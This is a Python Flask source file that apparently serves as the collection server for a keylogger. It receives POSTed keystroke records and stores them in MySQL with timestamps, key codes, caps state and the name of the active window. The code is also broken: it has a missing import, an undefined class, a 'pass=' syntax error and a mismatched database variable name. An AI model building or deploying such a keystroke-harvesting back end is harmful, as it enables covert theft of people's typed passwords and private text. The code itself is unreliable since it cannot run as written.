from flask import Flask, render_template, request, make_response, jsonify
import json
from json import JSONEncoder
import mysql.connector

keylog = []

#start flask app
app = Flask(__name__)

#load the configurations from json file
def load_cfg(path):
    jsonres = {}
    try:
        with open(os.path.abspath(os.path.realpath(path)), 'r') as f:
            jsonres = json.load(f)
    except Exception as e:
        print("Exception: ", e)
    return jsonres
    
@app.route('/')
def hello():
    return render_template('index.html')

@app.route('/pushKeys', methods=['POST'])
def addLog():
  data = json.loads(request.data)

  for key in range(len(data)):
    print(data[key])
    time = data[key]['time']
    key_down = data[key]['key-down']
    key_pressed = data[key]['key']

    k = Key(time,key_down,key_pressed)
    keylog.append(k)

  return make_response(jsonify({'response': 'Success', 'code':200}), 200)

def pushDB(payload):
  main_cfg = load_cfg('./main_cfg.json')
  
  db = mysql.connector.connect (
    host=main_cfg['dbHost'],
    user=main_cfg['sqlUser'],
    pass=main_cfg['sqlPass'],
  )
  
  mycursor = mydb.cursor()
  
  sql = f"INSERT INTO {main_cfg['dbTable']} {main_cfg['dbRows']} VALUES (%s, %s, %s, %s, %s, %s,%s, %s, %s)"
  val = (f"{payload['datetime']}", f"{payload['epochTime']}", f"{payload['isKeyDown']}", f"{payload['windowName']}", f"{payload['asciiCode']}", f"{payload['asciiChar']}", f"{payload['keyName']}", f"{payload['isCaps']}", f"{payload['processedKey']}")
  
  mycursor.execute(sql, val)
  db.commit()
  print(mycursor.rowcount, "it worked!!!")



if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int("443"), debug=True)
